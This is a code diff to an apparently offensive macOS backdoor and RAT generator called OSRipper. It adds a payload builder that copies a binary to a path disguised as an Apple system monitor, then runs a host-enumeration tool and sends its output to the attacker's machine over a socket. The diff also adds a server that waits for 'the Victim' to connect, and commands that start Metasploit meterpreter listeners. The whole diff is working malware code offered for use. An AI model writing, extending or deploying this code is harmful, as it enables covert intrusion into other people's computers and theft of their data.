@@ -138,6 +138,7 @@ main()
         print('After deployment interact with this Backdoor through this module in metasploit python/meterpreter/bind_tcp')
 def gen_rev():
     global name
+    global host
     name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
     host = input('Please enter the ip you wish the backdoor to connect back to: ')
     port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
@@ -201,6 +202,7 @@ main()
         print('To open a listener you can run this command "ncat -lvnp '+port+'"')
 def gen_rev_http():
     global name
+    global host
     name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
     host = input('Please enter the ip you wish the backdoor to connect back to: ')
     port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
@@ -230,6 +232,7 @@ main()
         print('After deployment interact with this Backdoor through this module in metasploit python/meterpreter/reverse_http')  
 def gen_rev_ssl_tcp():
     global name
+    global host
     name = 'ocr'
     host = input('Please enter the ip you wish the backdoor to connect back to: ')
     port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
@@ -286,25 +289,134 @@ def postgen():
         global name2
         name2=input('Please enter the name for the rat: ')
         with open(name2, 'a+') as hider:
+            hider.write(str('host = "'+host+'"\n'))
             v= '''
 from ast import AnnAssign
 import os
 import shutil
+import time
 from unicodedata import name
 directory_path = os.getcwd()
 folder_name = os.path.basename(directory_path)
 anan= __file__
 filename = anan.split('/')
 a=anan.replace(str(filename[-1]), '')
+src1=a+'swiftbelt/Swiftbelt'
 src=a+'ocr/ocr_or'
+dest1='/Users/Shared/swift'
 dest='/Users/Shared/com.apple.system.monitor'
 shutil.copyfile(src, dest)
+shutil.copy(src1, dest1)
+os.system('chmod u+x '+dest1)
+os.system(dest1+' > output.txt')
+time.sleep(10)
+import socket
+import tqdm
+import os
+import argparse
+
+SEPARATOR = "<SEPARATOR>"
+BUFFER_SIZE = 1024 * 4 #4KB
+try:
+
+    def send_file(filename, host, port):
+        # get the file size
+        filesize = os.path.getsize(filename)
+        # create the client socket
+        s = socket.socket()
+        print(f"[+] Connecting to {host}:{port}")
+        s.connect((host, port))
+
+        # send the filename and filesize
+        s.send(f"{filename}{SEPARATOR}{filesize}".encode())
+
+        # start sending the file
+        progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
+        with open(filename, "rb") as f:
+            while True:
+                # read the bytes from the file
+                bytes_read = f.read(BUFFER_SIZE)
+                if not bytes_read:
+                    # file transmitting is done
+                    break
+                # we use sendall to assure transimission in 
+                # busy networks
+                s.sendall(bytes_read)
+                # update the progress bar
+                progress.update(len(bytes_read))
+
+        # close the socket
+        s.close()
+
+    if __name__ == "__main__":
+
+        filename = 'output.txt'
+        host = str(host)
+        port = 5002
+        send_file(filename, host, port)
+except(ConnectionRefusedError):
+    pass
 os.system('chmod u+x '+dest)
 os.system(dest)
+
             '''
             hider.write(v)
             hider.close()
-            os.system('pyinstaller --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "dist/ocr_or:ocr" --windowed '+str(name2))
+            os.system('sudo pyinstaller --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "SwiftBelt:swiftbelt" --add-data "dist/ocr_or:ocr" --windowed '+str(name2))
+def server():
+    import socket
+    import tqdm
+    import os
+
+    # device's IP address
+    SERVER_HOST = "0.0.0.0"
+    SERVER_PORT = 5002
+    # receive 4096 bytes each time
+    BUFFER_SIZE = 4096
+    SEPARATOR = "<SEPARATOR>"
+    # create the server socket
+    # TCP socket
+    s = socket.socket()
+    # bind the socket to our local address
+    s.bind((SERVER_HOST, SERVER_PORT))
+    # enabling our server to accept connections
+    # 5 here is the number of unaccepted connections that
+    # the system will allow before refusing new connections
+    s.listen(5)
+    print(f"[*] Waiting for the Victim to run the backdoor")
+    # accept connection if there is any
+    client_socket, address = s.accept() 
+    # if below code is executed, that means the sender is connected
+    print(f"[+] {address} is connected.")
+
+    # receive the file infos
+    # receive using client socket, not server socket
+    received = client_socket.recv(BUFFER_SIZE).decode()
+    filename, filesize = received.split(SEPARATOR)
+    # remove absolute path if there is
+    filename = os.path.basename(filename)
+    # convert to integer
+    filesize = int(filesize)
+    # start receiving the file from the socket
+    # and writing to the file stream
+    progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
+    with open(filename, "wb") as f:
+        while True:
+            # read 1024 bytes from the socket (receive)
+            bytes_read = client_socket.recv(BUFFER_SIZE)
+            if not bytes_read:    
+                # nothing is received
+                # file transmitting is done
+                break
+            # write to the file the bytes we just received
+            f.write(bytes_read)
+            # update the progress bar
+            progress.update(len(bytes_read))
+
+    # close the client socket
+    client_socket.close()
+    # close the server socket
+    s.close()
 def cleanup():
     try:
         os.remove(os.getcwd()+'/dist/ocr_or')
@@ -340,6 +452,11 @@ if nscan == "3":
     gen_rev_http()
     postgen()
     cleanup()
+    os.system('clear')
+    print('Generated in dist')
+    print('OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target')
+    print('After that the listener will spawn instantly')
+    server()
     port=input('Please enter the port you want to listen on: ')
     a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_http;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
     os.system(a)
@@ -347,6 +464,11 @@ if nscan == "4":
     gen_rev_ssl_tcp()
     postgen()
     cleanup()
+    os.system('clear')
+    print('Generated in dist')
+    print('OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target')
+    print('After that the listener will spawn instantly')
+    server()
     port=input('Please enter the port you want to listen on: ')
     a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_tcp_ssl;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
     os.system(a)
